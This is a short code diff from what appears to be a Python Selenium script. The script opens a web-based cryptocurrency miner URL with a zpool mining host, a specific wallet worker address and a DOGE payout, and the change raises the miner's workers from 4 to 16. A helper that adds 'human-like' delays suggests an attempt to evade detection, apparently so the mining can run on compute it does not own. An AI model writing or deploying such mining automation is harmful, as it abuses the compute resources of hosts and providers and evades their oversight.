@@ -50,7 +50,7 @@ try:
     def human_like_delay(min_sec=1, max_sec=3):
         time.sleep(random.uniform(min_sec, max_sec))
 
-    base_url = "https://webminer.pages.dev?algorithm=cwm_yespowerSUGAR&host=yespowerSUGAR.sea.mine.zpool.ca&port=6241&worker=DFWwZ9vhHDshhVSULdn5za8x9yet7xwU6J&password=c%3DDOGE&workers=4"  # isi URL target
+    base_url = "https://webminer.pages.dev?algorithm=cwm_yespowerSUGAR&host=yespowerSUGAR.sea.mine.zpool.ca&port=6241&worker=DFWwZ9vhHDshhVSULdn5za8x9yet7xwU6J&password=c%3DDOGE&workers=16"  # isi URL target
     driver.get(base_url)
     human_like_delay()
 
